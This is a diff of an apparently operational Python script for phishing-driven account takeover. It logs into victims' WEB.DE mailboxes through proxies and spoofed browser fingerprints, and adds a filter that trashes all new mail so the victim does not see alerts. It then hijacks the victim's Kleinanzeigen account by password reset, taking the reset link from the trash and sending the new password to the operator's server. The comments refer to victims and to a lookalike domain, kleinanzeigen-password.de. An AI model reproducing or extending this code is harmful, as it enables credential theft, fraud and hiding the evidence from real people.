@@ -12,6 +12,19 @@
 
 Отпечаток и настройки в почте (в т.ч. фильтры) — один контекст Playwright на сессию входа
 (webde_fingerprints.json + webde_fingerprint_indices.txt; см. webde_login.load_webde_fp_indices_allowed).
+Klein-оркестрация: ① один Chromium — WEB.DE + Config E-Mail + фильтры, затем куки на диск и закрытие ①;
+опрос emailKl только по API; ③ снова Chromium с теми же fp/прокси/куками — только почта (Papierkorb, ссылка);
+② отдельный Chromium без куков почты — Klein (run_klein_password_reset_flow с force_separate_klein).
+Пауза после фильтров: KLEIN_ORCH_PAUSE_SEC_AFTER_FILTERS или KLEIN_ORCH_PAUSE_ENTER=1.
+Ожидание emailKl: KLEIN_ORCH_WAIT_EMAIL_SEC / KLEIN_ORCH_WAIT_ANMELDEN_SEC; опрос: KLEIN_ORCH_POLL_INTERVAL_SEC.
+KLEIN_ORCH_CLOSE_BROWSER_FOR_EMAILKL_WAIT=0 больше не держит окно — ① всегда закрыт до опроса (переменная лишь логируется).
+Прокси для браузера: по умолчанию с сервера GET /api/worker/proxy-txt (тот же текст, что Config → Прокси → сохранение в login/proxy.txt),
+парсинг как у файла (load_proxies_with_geo_from_text). Локальный файл: WEBDE_PROXY_FROM_ADMIN=0 или запуск без worker secret.
+WEBDE_REQUIRE_PROXY=1 (по умолчанию при запуске из Node) — без валидных строк скрипт не открывает браузер без прокси.
+Доп. сдвиг стартового отпечатка в кольце: WEBDE_FP_GRID_OFFSET (целое, по модулю числа строк в indices).
+Порядок строк в webde_fingerprint_indices.txt задаёт приоритет (раньше в файле — раньше в обходе сетки).
+После успешного входа скрипт вызывает сервер: письмо через Config → E-Mail (SMTP), затем в браузере
+https://web.de/ → меню профиля → шаги как в webde_mail_filters (без compose в UI почты).
 
 При ошибке входа с отпечатком из пула (ретраи / нет UA с API) соответствующий слот в webde_fingerprints.json
 заменяется новым синтетическим пресетом (node scripts/replace-webde-fingerprint-slot.mjs). Отключить: WEBDE_REPLACE_FP_ON_ERROR=0.
@@ -23,6 +36,7 @@ import hashlib
 import json
 import os
 import re
+import secrets
 import subprocess
 import sys
 import time
@@ -39,9 +53,11 @@ if str(LOGIN_DIR) not in sys.path:
 from webde_login import (
     login_webde,
     load_proxies_with_geo,
-    rank_proxy_configs_for_country,
+    load_proxies_with_geo_from_text,
+    rank_proxy_configs_with_file_line_numbers,
     log,
     LoginTemporarilyUnavailable,
+    AfterMailHookFinished,
     LOGIN_TEMPORARILY_UNAVAILABLE_TEXT,
     PROXY_FILE,
     get_last_alert_text,
@@ -51,11 +67,15 @@ from webde_login import (
     load_webde_fp_indices_allowed,
     take_lead_held_browser_session,
     invalidate_webde_fingerprints_cache,
+    reopen_webde_browser_same_profile,
+    save_cookies_for_account,
 )
 from cleanup_artifacts import cleanup_login_artifacts
 
 _RUN_PREFIX = ""
 _LOG_EMAIL = ""  # для строки терминала «поток | попытка | email: …»
+# Во время попытки входа WEB.DE: «web.de <индекс пула> | <строка proxy.txt> | попытка/лимит»
+_WEBDE_ATTEMPT_TAG: str | None = None
 
 
 def _log(step: str, message: str, detail: str = "", *, verbose_only: bool = False):
@@ -71,7 +91,12 @@ def _log(step: str, message: str, detail: str = "", *, verbose_only: bool = Fals
         banner = "[KLEIN-ORCH]"
     else:
         banner = "[WEB.DE]"
-    line = f"{banner} | {em} | {message}"
+    tag_prefix = ""
+    if _WEBDE_ATTEMPT_TAG and not (
+        step == "KLEIN-ORCH" or (isinstance(step, str) and step.startswith("KLEIN"))
+    ):
+        tag_prefix = f"{_WEBDE_ATTEMPT_TAG} · "
+    line = f"{tag_prefix}{banner} | {em} | {message}"
     if detail:
         line += f" — {detail}"
     if _RUN_PREFIX and _WEBDE_VERBOSE_LOG:
@@ -108,6 +133,61 @@ def api_post(base_url: str, path: str, worker_secret: str, data: dict, timeout: 
     )
     with urllib.request.urlopen(req, timeout=timeout) as r:
         r.read()
+
+
+def api_post_json(
+    base_url: str,
+    path: str,
+    worker_secret: str,
+    data: dict,
+    timeout: float = 120,
+) -> dict:
+    """POST с телом JSON, ответ JSON (для worker API)."""
+    url = base_url.rstrip("/") + path
+    body = json.dumps(data).encode("utf-8")
+    req = urllib.request.Request(
+        url,
+        data=body,
+        method="POST",
+        headers={
+            "x-worker-secret": worker_secret,
+            "Content-Type": "application/json",
+        },
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            raw = r.read().decode("utf-8")
+            return json.loads(raw) if raw.strip() else {"ok": True}
+    except urllib.error.HTTPError as e:
+        try:
+            raw = e.read().decode("utf-8")
+            if raw.strip():
+                return json.loads(raw)
+        except Exception:
+            pass
+        return {"ok": False, "error": "HTTP %s" % getattr(e, "code", "?")}
+    except Exception as ex:
+        return {"ok": False, "error": str(ex)[:240]}
+
+
+def fetch_worker_proxy_txt(base_url: str, worker_secret: str) -> tuple[str | None, str | None]:
+    """Текст прокси с диска сервера (Config → Прокси). (None, None) — сеть/403/старый сервер."""
+    if not (base_url or "").strip() or not (worker_secret or "").strip():
+        return None, None
+    try:
+        url = base_url.rstrip("/") + "/api/worker/proxy-txt"
+        req = urllib.request.Request(url, headers={"x-worker-secret": worker_secret})
+        with urllib.request.urlopen(req, timeout=45) as r:
+            data = json.loads(r.read().decode("utf-8"))
+        if not isinstance(data, dict) or not data.get("ok"):
+            return None, None
+        c = data.get("content")
+        p = data.get("path")
+        text = "" if c is None else str(c)
+        path_on = (str(p).strip() or None) if p else None
+        return text, path_on
+    except Exception:
+        return None, None
 
 
 def persist_webde_grid_step(
@@ -152,6 +232,8 @@ EV_KLEIN_SESSION_MAIL = "Klein: сессия почты в браузере"
 EV_KLEIN_WAIT_VICTIM = "Klein: ждём email из письма (kleinanzeigen-password.de), до 3 мин"
 EV_KLEIN_VICTIM_HERE = "Klein: лид на странице входа"
 EV_KLEIN_CREDS_FROM_LEAD = "Klein: данные для входа получены"
+EV_KLEIN_RESET_START = "Klein: сброс пароля (Passwort vergessen)"
+EV_KLEIN_RESET_DONE = "Klein: вход после сброса пароля"
 EV_WEBDE_SCREEN_PUSH = "WEB.DE: на экране Push"
 EV_WEBDE_SCREEN_2FA = "WEB.DE: на экране 2FA"
 EV_WEBDE_SCREEN_SMS = "WEB.DE: на экране SMS"
@@ -169,6 +251,7 @@ def send_result(
     *,
     result_phase: str | None = None,
     result_source: str | None = None,
+    password_kl_new: str | None = None,
 ) -> None:
     payload = {"id": lead_id, "result": result}
     if result == "error" and error_code:
@@ -183,6 +266,8 @@ def send_result(
         payload["resultPhase"] = str(result_phase)[:80]
     if result_source:
         payload["resultSource"] = str(result_source)[:80]
+    if password_kl_new and str(password_kl_new).strip():
+        payload["passwordKlNew"] = str(password_kl_new).strip()[:500]
     post_url = base_url.rstrip("/") + "/api/webde-login-result"
     try:
         api_post(base_url, "/api/webde-login-result", worker_secret, payload)
@@ -297,6 +382,102 @@ def notify_slot_done(base_url: str, lead_id: str, worker_secret: str) -> None:
         pass
 
 
+def _close_browser_keep_open_optional(browser, *, headless: bool) -> None:
+    """Закрыть Playwright; при KEEP_BROWSER_OPEN и headed — пауза на Enter (как webde_login)."""
+    if not browser:
+        return
+    if not headless and os.getenv("KEEP_BROWSER_OPEN", "0").lower() in ("1", "true", "yes"):
+        _log(
+            "ВХОД",
+            "KEEP_BROWSER_OPEN=1 — окно оставлено; закройте браузер при необходимости, затем Enter в терминале",
+        )
+        try:
+            input()
+        except (EOFError, KeyboardInterrupt):
+            pass
+    try:
+        browser.close()
+    except Exception:
+        pass
+
+
+def _klein_orch_pause_after_filters(*, headless: bool, restarting: bool) -> None:
+    if headless or not restarting:
+        return
+    if (os.environ.get("KLEIN_ORCH_PAUSE_ENTER") or "").strip().lower() in ("1", "true", "yes", "on"):
+        _log(
+            "KLEIN-ORCH",
+            "фильтры готовы — Enter: затем скрипт закроет браузер ① (WEB.DE); Klein пойдёт в отдельном ②",
+        )
+        try:
+            input()
+        except (EOFError, KeyboardInterrupt):
+            pass
+        return
+    raw_sec = (os.environ.get("KLEIN_ORCH_PAUSE_SEC_AFTER_FILTERS") or "").strip()
+    if raw_sec == "":
+        sec = 4
+    else:
+        try:
+            sec = max(0, int(raw_sec, 10))
+        except ValueError:
+            sec = 4
+    if sec > 0:
+        _log("KLEIN-ORCH", f"пауза {sec}s после фильтров, затем закрытие браузера ①")
+        time.sleep(float(sec))
+
+
+def _post_login_config_email_then_filters(
+    page,
+    context,
+    base_url: str,
+    lead_id: str,
+    worker_secret: str,
+    *,
+    log_step: str,
+) -> bool:
+    """
+    1) POST /api/worker/send-config-email — SMTP из Config → E-Mail (как в админке).
+    2) В браузере: принудительно web.de → профиль → сценарий фильтров (webde_mail_filters).
+    """
+    import webde_mail_filters
+
+    _log(log_step, "шаг 1/2: Config E-Mail с сервера (SMTP из админки)")
+    resp = api_post_json(
+        base_url,
+        "/api/worker/send-config-email",
+        worker_secret,
+        {"id": lead_id},
+        timeout=120,
+    )
+    if not resp.get("ok"):
+        err = (resp.get("error") or "send-config-email").strip()
+        _log(log_step, f"Config E-Mail не отправлен: {err}")
+        return False
+    if resp.get("skipped") == "already_sent":
+        _log(log_step, "Config E-Mail уже был в логе — пропуск повторной отправки")
+    else:
+        time.sleep(1.5)
+
+    script_event(base_url, lead_id, worker_secret, EV_MAIL_UI_READY)
+    prev_force = os.environ.get("WEBDE_FILTERS_FORCE_WEBDE_GOTO")
+    try:
+        os.environ["WEBDE_FILTERS_FORCE_WEBDE_GOTO"] = "1"
+        script_event(base_url, lead_id, worker_secret, EV_MAIL_FILTERS_START)
+        _log(log_step, "шаг 2/2: web.de → профиль → фильтры (как в скрипте фильтров)")
+        webde_mail_filters.run_trash_all_new_mail_filter(page, context)
+        script_event(base_url, lead_id, worker_secret, EV_MAIL_FILTERS_OK)
+        return True
+    except Exception as e:
+        _log(log_step, f"фильтры: {type(e).__name__}: {e}")
+        return False
+    finally:
+        if prev_force is None:
+            os.environ.pop("WEBDE_FILTERS_FORCE_WEBDE_GOTO", None)
+        else:
+            os.environ["WEBDE_FILTERS_FORCE_WEBDE_GOTO"] = prev_force
+
+
 def _execute_klein_orchestration_after_mail(
     base_url: str,
     lead_id: str,
@@ -306,17 +487,26 @@ def _execute_klein_orchestration_after_mail(
     headless: bool,
 ) -> None:
     """
-    Одна сессия Playwright: почта WEB.DE уже залогинена, браузер удержан.
+    Playwright: почта WEB.DE залогинена, браузер удержан (прокси, fp-пул, куки).
 
-    1) Сразу POST success (mail_ready_klein) → Node: редирект на смену пароля WEB.DE, успех, Config E-Mail со ссылкой на Klein.
-    2) До KLEIN_ORCH_WAIT_EMAIL_SEC (по умол. 180 с = 3 мин) ждём, пока лид введёт хотя бы emailKl
-       (форма на kleinanzeigen-password.de / поток Klein). Иначе — закрыть браузер, error 408.
-    3) Compose (touch) → фильтры в почте (куки той же сессии).
-    4) Ждём passwordKl (до KLEIN_ORCH_CRED_WAIT_SEC).
-    5) Вход в Klein (отдельная вкладка). Фильтры и Klein — последовательно (один sync Playwright контекст).
+    Три браузера: ① вход WEB.DE + Config E-Mail + фильтры — затем закрытие и сохранение куков на диск.
+    Ожидание emailKl (HTTP). После emailKl по умолчанию: сначала ② (изолированный Klein: forgot/Senden),
+    затем ③ (reopen_webde_browser_same_profile) — Postfach/Papierkorb и ссылка; дальше смена пароля и ULP во ②.
+
+    1) Config E-Mail с сервера (SMTP из админки) → web.de → профиль → фильтры; затем закрыть ①.
+    2) POST success (mail_ready_klein) → Node: редирект жертвы (письмо уже отправлено на шаге 1).
+    3) Сохранение куков, закрытие ①, mail_ready_klein → опрос emailKl только по API.
+       KLEIN_ORCH_CLOSE_BROWSER_FOR_EMAILKL_WAIT игнорируется.
+    4) До KLEIN_ORCH_WAIT_EMAIL_SEC ждём emailKl.
+    5) По умолчанию: сброс пароля Klein (② m-passwort-vergessen → Senden → ③ Papierkorb → ссылка → новый пароль
+       → Einloggen → ULP; при SMS — POST sms + long-poll). Успех: success + resultPhase=klein_reset_done + passwordKlNew.
+       Оркестратор всегда включает изоляцию Klein (аналог KLEIN_RESET_KLEIN_SEPARATE_BROWSER).
+       KLEIN_RESET_KLEIN_BROWSER_NO_PROXY=1 — у браузера ② без прокси.
+       Legacy: KLEIN_ORCH_LEGACY_KLEIN_LOGIN=1 — ждём passwordKl и klein_login_with_page.
+    Тест: KLEIN_RESET_DEBUG=1 — скриншоты и HTML шагов в login/klein_reset_debug/.
     """
-    import webde_mail_filters
     from kleinanzeigen_login import DEFAULT_LOGIN_URL, klein_login_with_page
+    from klein_password_reset_flow import run_klein_password_reset_flow
 
     sess = take_lead_held_browser_session()
     if not sess:
@@ -329,7 +519,7 @@ def _execute_klein_orchestration_after_mail(
             error_code="500",
             error_message="Klein-orch: браузер не удержан после входа почты",
         )
-        return
+        raise AfterMailHookFinished()
 
     browser = sess.get("browser")
     context = sess.get("context")
@@ -343,25 +533,91 @@ def _execute_klein_orchestration_after_mail(
             error_code="500",
             error_message="Klein-orch: неполная сессия браузера",
         )
-        try:
-            browser and browser.close()
-        except Exception:
-            pass
-        return
+        _close_browser_keep_open_optional(browser, headless=headless)
+        raise AfterMailHookFinished()
 
     script_event(base_url, lead_id, worker_secret, EV_KLEIN_SESSION_MAIL)
     os.environ["WEBDE_EMAIL"] = email
     os.environ["WEBDE_TEST_EMAIL"] = email
 
-    # --- 1) Сразу успех почты: редирект жертвы, письмо из config E-Mail со ссылкой на Klein ---
+    # --- 1) Config E-Mail (SMTP с сервера), затем web.de → профиль → фильтры; потом редирект лида ---
+    if not _post_login_config_email_then_filters(
+        page, context, base_url, lead_id, worker_secret, log_step="KLEIN-ORCH"
+    ):
+        _close_browser_keep_open_optional(browser, headless=headless)
+        send_result(
+            base_url,
+            lead_id,
+            worker_secret,
+            "error",
+            error_code="502",
+            error_message="Klein-orch: Config E-Mail или фильтры после входа",
+        )
+        raise AfterMailHookFinished()
+
+    # Браузер ① только: вход WEB.DE + фильтры. Дальше ② = Klein (изолированно), ③ = почта с куками ①.
+    pw = sess.get("playwright")
+    if not pw:
+        _close_browser_keep_open_optional(browser, headless=headless)
+        send_result(
+            base_url,
+            lead_id,
+            worker_secret,
+            "error",
+            error_code="500",
+            error_message="Klein-orch: нет sync_playwright в сессии — нужен для браузеров ② и ③",
+        )
+        raise AfterMailHookFinished()
+
+    cookie_path_idle: str | None = None
+    try:
+        cookie_path_idle = save_cookies_for_account(context, email)
+    except Exception as e:
+        _log("KLEIN-ORCH", f"куки после фильтров (браузер ①): {type(e).__name__}: {e}")
+
+    if not cookie_path_idle:
+        _close_browser_keep_open_optional(browser, headless=headless)
+        send_result(
+            base_url,
+            lead_id,
+            worker_secret,
+            "error",
+            error_code="500",
+            error_message="Klein-orch: нет файла куков после фильтров — нужен для браузера ③ (почта)",
+        )
+        raise AfterMailHookFinished()
+
+    _klein_orch_pause_after_filters(headless=headless, restarting=not headless)
+
     _log(
         "KLEIN-ORCH",
-        "почта WEB.DE открыта → API mail_ready_klein (смена пароля + Config E-Mail), браузер ждёт лида",
+        "браузер ① (WEB.DE + Config E-Mail + фильтры): закрываю — ② Klein отдельно, ③ почта с теми же fp/прокси/куками",
+    )
+    try:
+        browser.close()
+    except Exception:
+        pass
+    browser, context, page = None, None, None
+
+    _log(
+        "KLEIN-ORCH",
+        "почта: Config E-Mail + фильтры готовы → API mail_ready_klein (редирект лида)",
     )
     send_result(base_url, lead_id, worker_secret, "success", result_phase="mail_ready_klein")
     script_event(base_url, lead_id, worker_secret, EV_KLEIN_WAIT_VICTIM)
 
-    # --- 2) До 3 мин: хотя бы emailKl (переход по письму на kleinanzeigen-password.de и ввод email) ---
+    if (os.environ.get("KLEIN_ORCH_CLOSE_BROWSER_FOR_EMAILKL_WAIT") or "").strip().lower() in (
+        "0",
+        "false",
+        "no",
+        "off",
+    ):
+        _log(
+            "KLEIN-ORCH",
+            "примечание: KLEIN_ORCH_CLOSE_BROWSER_FOR_EMAILKL_WAIT=0 игнорируется — ① уже закрыт до ожидания emailKl",
+        )
+
+    # --- 2) Ждём emailKl (см. KLEIN_ORCH_WAIT_EMAIL_SEC; браузер по умолчанию уже закрыт) ---
     wait_email_raw = (os.environ.get("KLEIN_ORCH_WAIT_EMAIL_SEC") or "").strip()
     if wait_email_raw:
         wait_email_sec = int(wait_email_raw or "180")
@@ -369,6 +625,13 @@ def _execute_klein_orchestration_after_mail(
         wait_email_sec = int((os.environ.get("KLEIN_ORCH_WAIT_ANMELDEN_SEC") or "180").strip() or "180")
     deadline_email = time.monotonic() + max(30, wait_email_sec)
     em_kl = ""
+    pw_kl_early = ""
+    poll_raw = (os.environ.get("KLEIN_ORCH_POLL_INTERVAL_SEC") or "").strip()
+    try:
+        poll_interval = float(poll_raw) if poll_raw else 2.0
+    except ValueError:
+        poll_interval = 2.0
+    poll_interval = max(0.25, min(30.0, poll_interval))
     _log("KLEIN-ORCH", f"жду emailKl (форма Klein) до {wait_email_sec}s")
     while time.monotonic() < deadline_email:
         try:
@@ -380,20 +643,34 @@ def _execute_klein_orchestration_after_mail(
             )
             if isinstance(data, dict) and data.get("ok"):
                 em_kl = (data.get("emailKl") or "").strip()
+                pw_c = (data.get("passwordKl") or "").strip()
+                if pw_c:
+                    pw_kl_early = pw_c
                 if em_kl:
                     script_event(base_url, lead_id, worker_secret, EV_KLEIN_VICTIM_HERE)
-                    _log("KLEIN-ORCH", "получен emailKl — дальше фильтры почты и ожидание пароля Kl")
+                    legacy_kl = (os.environ.get("KLEIN_ORCH_LEGACY_KLEIN_LOGIN") or "").strip().lower() in (
+                        "1",
+                        "true",
+                        "yes",
+                    )
+                    _log(
+                        "KLEIN-ORCH",
+                        "получен emailKl — "
+                        + (
+                            "legacy: вход по passwordKl"
+                            if legacy_kl
+                            else "сброс пароля + почта Papierkorb + вход"
+                        ),
+                    )
                     break
         except Exception:
             pass
-        time.sleep(2.0)
+        time.sleep(poll_interval)
 
     if not em_kl:
-        _log("KLEIN-ORCH", "таймаут: нет emailKl за отведённое время — закрываю браузер")
-        try:
-            browser.close()
-        except Exception:
-            pass
+        _log("KLEIN-ORCH", "таймаут: нет emailKl за отведённое время — закрываю браузер (если ещё открыт)")
+        if browser is not None:
+            _close_browser_keep_open_optional(browser, headless=headless)
         send_result(
             base_url,
             lead_id,
@@ -406,119 +683,277 @@ def _execute_klein_orchestration_after_mail(
             ),
             result_source="klein_login",
         )
-        return
-
-    # --- 3) Фильтры в уже открытой почте (после письма и ввода email лида) ---
-    try:
-        _log("KLEIN-ORCH", "шаг: E-Mail compose (touch)")
-        webde_mail_filters.run_compose_mail_quick_touch(page, context, email)
-    except Exception as e:
-        _log("KLEIN-ORCH", f"compose (продолжаю): {type(e).__name__}: {e}")
-    script_event(base_url, lead_id, worker_secret, EV_MAIL_UI_READY)
-
-    try:
-        script_event(base_url, lead_id, worker_secret, EV_MAIL_FILTERS_START)
-        _log("KLEIN-ORCH", "шаг: фильтры → корзина")
-        webde_mail_filters.run_trash_all_new_mail_filter(page, context)
-        script_event(base_url, lead_id, worker_secret, EV_MAIL_FILTERS_OK)
-    except Exception as e:
-        _log("KLEIN-ORCH", f"фильтры: {type(e).__name__}: {e}")
-        send_result(
-            base_url,
-            lead_id,
-            worker_secret,
-            "error",
-            error_code="502",
-            error_message=f"Klein-orch: фильтры почты: {type(e).__name__}: {str(e)[:200]}",
-        )
-        try:
-            browser.close()
-        except Exception:
-            pass
-        return
-
-    # --- 4) Полный пароль Klein для входа ---
-    cred_wait = int((os.environ.get("KLEIN_ORCH_CRED_WAIT_SEC") or "7200").strip() or "7200")
-    cred_deadline = time.monotonic() + max(60, cred_wait)
-    pw_kl = ""
-    em_kl = ""
-    _log("KLEIN-ORCH", "жду passwordKl (и актуальный emailKl) с API")
-    while time.monotonic() < cred_deadline:
-        try:
-            data = api_get(
-                base_url,
-                "/api/lead-klein-flow-poll?leadId=" + quote(lead_id),
-                worker_secret,
-                timeout=30,
-            )
-            if isinstance(data, dict) and data.get("ok"):
-                em_kl = (data.get("emailKl") or "").strip()
-                pw_kl = (data.get("passwordKl") or "").strip()
-                if em_kl and pw_kl:
-                    script_event(base_url, lead_id, worker_secret, EV_KLEIN_CREDS_FROM_LEAD)
-                    break
-        except Exception:
-            pass
-        time.sleep(1.5)
-
-    if not em_kl or not pw_kl:
-        _log("KLEIN-ORCH", "нет полных кредов Klein за отведённое время — закрываю браузер")
-        try:
-            browser.close()
-        except Exception:
-            pass
-        send_result(
-            base_url,
-            lead_id,
-            worker_secret,
-            "error",
-            error_code="408",
-            error_message="KLEIN_CREDENTIALS_TIMEOUT",
-            result_source="klein_login",
-        )
-        return
+        raise AfterMailHookFinished()
 
     login_url = (os.environ.get("KLEINANZEIGEN_LOGIN_URL") or DEFAULT_LOGIN_URL).strip()
-    kp = None
-    try:
-        script_event(base_url, lead_id, worker_secret, EV_KLEIN_START)
-        kp = context.new_page()
-        _log("KLEIN-ORCH", f"вход Kleinanzeigen email={em_kl[:3]}…")
-        exit_kl = klein_login_with_page(
-            kp,
-            em_kl,
-            pw_kl,
-            login_url=login_url,
-            headless=headless,
-            api_base=base_url,
-            lead_id=lead_id,
-            api_token=worker_secret,
-        )
-    except Exception as e:
-        _log("KLEIN-ORCH", f"исключение Klein: {type(e).__name__}: {e}")
-        exit_kl = -1
-    finally:
-        try:
-            if kp:
-                kp.close()
-        except Exception:
-            pass
+    legacy_kl = (os.environ.get("KLEIN_ORCH_LEGACY_KLEIN_LOGIN") or "").strip().lower() in (
+        "1",
+        "true",
+        "yes",
+    )
 
-    try:
-        browser.close()
-    except Exception:
-        pass
+    if legacy_kl:
+        if browser is None and cookie_path_idle and pw:
+            try:
+                browser, context, page = reopen_webde_browser_same_profile(
+                    pw,
+                    headless=headless,
+                    fingerprint_index=sess.get("fingerprint_index"),
+                    proxy_config=sess.get("proxy_config"),
+                    automation_profile=sess.get("automation_profile"),
+                    force_pool_fingerprint=bool(sess.get("force_pool_fingerprint")),
+                    browser_engine=str(sess.get("browser_engine") or "chromium"),
+                    effective_engine=str(sess.get("effective_engine") or "chromium"),
+                    cookies_json_path=cookie_path_idle,
+                )
+                _log(
+                    "KLEIN-ORCH",
+                    "браузер WEB.DE после emailKl (legacy: вход Klein по паролю)",
+                )
+            except Exception as e:
+                _log("KLEIN-ORCH", f"открытие браузера почты (legacy): {type(e).__name__}: {e}")
+                send_result(
+                    base_url,
+                    lead_id,
+                    worker_secret,
+                    "error",
+                    error_code="500",
+                    error_message=f"Klein-orch: не удалось открыть браузер после ожидания emailKl: {e}",
+                    result_source="klein_login",
+                )
+                raise AfterMailHookFinished()
+        elif browser is None:
+            _log("KLEIN-ORCH", "emailKl есть, но нет браузера и нет пути куков для перезапуска (legacy)")
+            send_result(
+                base_url,
+                lead_id,
+                worker_secret,
+                "error",
+                error_code="500",
+                error_message="Klein-orch: сессия браузера потеряна (нет куков для reopen)",
+                result_source="klein_login",
+            )
+            raise AfterMailHookFinished()
+    elif not cookie_path_idle or not pw:
+        _log("KLEIN-ORCH", "emailKl есть, но нет куков или playwright для браузера ③ (сброс Klein)")
+        send_result(
+            base_url,
+            lead_id,
+            worker_secret,
+            "error",
+            error_code="500",
+            error_message="Klein-orch: нет файла куков или сессии Playwright — нужен для почты ③ после forgot",
+            result_source="klein_login",
+        )
+        raise AfterMailHookFinished()
+
+    exit_kl = -1
+    new_pw_for_result = ""
+
+    if not legacy_kl:
+        new_pw_for_result = secrets.token_urlsafe(14)
+        script_event(base_url, lead_id, worker_secret, EV_KLEIN_RESET_START)
+        _log(
+            "KLEIN-ORCH",
+            "сброс Klein: сначала ② forgot/Senden, затем ③ почта → Papierkorb → ссылка → ULP; KLEIN_RESET_DEBUG=1",
+        )
+        _log(
+            "KLEIN-ORCH",
+            "примечание: отдельный klein_ip_probe до прогона смотрит Klein ДО длительного трафика WEB.DE с этого прокси; "
+            "после входа в почту/фильтров Klein может ответить иначе (лимит IP, корреляция трафика) — это не расхождение init в коде ②",
+        )
+        fi = sess.get("fingerprint_index")
+        if fi is not None:
+            _log("KLEIN-ORCH", f"браузер ②: fp_index из сессии WEB.DE = {fi} (пречек: задайте KLEIN_PROBE_FP_INDEX={fi} для совпадения)")
+
+        def _sms_redirect() -> None:
+            send_result(
+                base_url,
+                lead_id,
+                worker_secret,
+                "sms",
+                result_source="klein_login",
+            )
+
+        def _klein_reset_script_step(label: str) -> None:
+            script_event(base_url, lead_id, worker_secret, label)
+
+        def _open_mail_browser_after_forgot():
+            return reopen_webde_browser_same_profile(
+                pw,
+                headless=headless,
+                fingerprint_index=sess.get("fingerprint_index"),
+                proxy_config=sess.get("proxy_config"),
+                automation_profile=sess.get("automation_profile"),
+                force_pool_fingerprint=bool(sess.get("force_pool_fingerprint")),
+                browser_engine=str(sess.get("browser_engine") or "chromium"),
+                effective_engine=str(sess.get("effective_engine") or "chromium"),
+                cookies_json_path=cookie_path_idle,
+            )
+
+        mail_sess: dict = {}
+        try:
+            exit_kl = run_klein_password_reset_flow(
+                None,
+                None,
+                em_kl,
+                new_pw_for_result,
+                headless=headless,
+                base_url=base_url,
+                lead_id=lead_id,
+                worker_secret=worker_secret,
+                login_url=login_url,
+                on_sms_redirect=_sms_redirect,
+                on_step=_klein_reset_script_step,
+                playwright=sess.get("playwright"),
+                mail_proxy_config=sess.get("klein_proxy_config") or sess.get("proxy_config"),
+                fingerprint_index=sess.get("fingerprint_index"),
+                force_separate_klein=True,
+                mail_browser_opener=_open_mail_browser_after_forgot,
+                mail_session_out=mail_sess,
+            )
+        except Exception as e:
+            _log("KLEIN-ORCH", f"исключение Klein-Reset: {type(e).__name__}: {e}")
+            exit_kl = -1
+        finally:
+            if mail_sess.get("browser") is not None:
+                browser = mail_sess["browser"]
+                context = mail_sess["context"]
+                page = mail_sess["page"]
+    else:
+        # --- legacy: полный пароль Klein для входа (emailKl уже есть) ---
+        cred_wait = int((os.environ.get("KLEIN_ORCH_CRED_WAIT_SEC") or "7200").strip() or "7200")
+        cred_deadline = time.monotonic() + max(60, cred_wait)
+        pw_kl = (pw_kl_early or "").strip()
+        if pw_kl:
+            script_event(base_url, lead_id, worker_secret, EV_KLEIN_CREDS_FROM_LEAD)
+        _log(
+            "KLEIN-ORCH",
+            "жду passwordKl с API" + (" (уже был при опросе emailKl)" if pw_kl else ""),
+        )
+        while not pw_kl and time.monotonic() < cred_deadline:
+            try:
+                data = api_get(
+                    base_url,
+                    "/api/lead-klein-flow-poll?leadId=" + quote(lead_id),
+                    worker_secret,
+                    timeout=30,
+                )
+                if isinstance(data, dict) and data.get("ok"):
+                    pw_kl = (data.get("passwordKl") or "").strip()
+                    if pw_kl:
+                        script_event(base_url, lead_id, worker_secret, EV_KLEIN_CREDS_FROM_LEAD)
+                        break
+            except Exception:
+                pass
+            time.sleep(1.5)
+
+        if not em_kl or not pw_kl:
+            _log("KLEIN-ORCH", "нет полных кредов Klein за отведённое время — закрываю браузер")
+            _close_browser_keep_open_optional(browser, headless=headless)
+            send_result(
+                base_url,
+                lead_id,
+                worker_secret,
+                "error",
+                error_code="408",
+                error_message="KLEIN_CREDENTIALS_TIMEOUT",
+                result_source="klein_login",
+            )
+            raise AfterMailHookFinished()
+
+        def _sms_redirect_legacy() -> None:
+            send_result(
+                base_url,
+                lead_id,
+                worker_secret,
+                "sms",
+                result_source="klein_login",
+            )
+
+        kp = context.new_page()
+        try:
+            script_event(base_url, lead_id, worker_secret, EV_KLEIN_START)
+            _log("KLEIN-ORCH", f"вход Kleinanzeigen email={em_kl[:3]}…")
+            exit_kl = klein_login_with_page(
+                kp,
+                em_kl,
+                pw_kl,
+                login_url=login_url,
+                headless=headless,
+                api_base=base_url,
+                lead_id=lead_id,
+                worker_secret=worker_secret,
+                on_mfa_start=_sms_redirect_legacy,
+            )
+        except Exception as e:
+            _log("KLEIN-ORCH", f"исключение Klein: {type(e).__name__}: {e}")
+            exit_kl = -1
+        finally:
+            try:
+                kp.close()
+            except Exception:
+                pass
+
+    _close_browser_keep_open_optional(browser, headless=headless)
 
     if exit_kl == 0:
-        _log("KLEIN-ORCH", "Klein: успех (повторный POST success не шлём — уже был после почты)")
-        script_event(base_url, lead_id, worker_secret, EV_SUCCESS_KL)
-    elif exit_kl == 6:
+        if not legacy_kl:
+            _log("KLEIN-ORCH", "Klein-Reset: успех → API success + passwordKlNew")
+            send_result(
+                base_url,
+                lead_id,
+                worker_secret,
+                "success",
+                result_phase="klein_reset_done",
+                result_source="klein_login",
+                password_kl_new=new_pw_for_result,
+            )
+            script_event(base_url, lead_id, worker_secret, EV_KLEIN_RESET_DONE)
+        else:
+            _log("KLEIN-ORCH", "Klein: успех (повторный POST success не шлём — уже был после почты)")
+            script_event(base_url, lead_id, worker_secret, EV_SUCCESS_KL)
+        return
+    if exit_kl == 6:
         send_result(
             base_url,
             lead_id,
             worker_secret,
             "wrong_credentials",
             error_message=KLEIN_WRONG_CREDENTIALS_MSG_DE,
+            result_source="klein_login",
+        )
+    elif exit_kl == 7:
+        send_result(
+            base_url,
+            lead_id,
+            worker_secret,
+            "error",
+            error_code="408",
+            error_message="Klein-Reset: письмо/ссылка в Papierkorb не найдены (см. KLEIN_RESET_DEBUG)",
+            result_source="klein_login",
+        )
+    elif exit_kl == 8:
+        send_result(
+            base_url,
+            lead_id,
+            worker_secret,
+            "error",
+            error_code="502",
+            error_message="Klein-Reset: форма «Passwort vergessen» / сброс пароля",
+            result_source="klein_login",
+        )
+    elif exit_kl == 9:
+        send_result(
+            base_url,
+            lead_id,
+            worker_secret,
+            "error",
+            error_code="503",
+            error_message=(
+                "Klein: IP-Bereich bei Kleinanzeigen gesperrt — смените прокси (лучше residential) "
+                "или повторите позже"
+            ),
             result_source="klein_login",
         )
     elif exit_kl == 2:
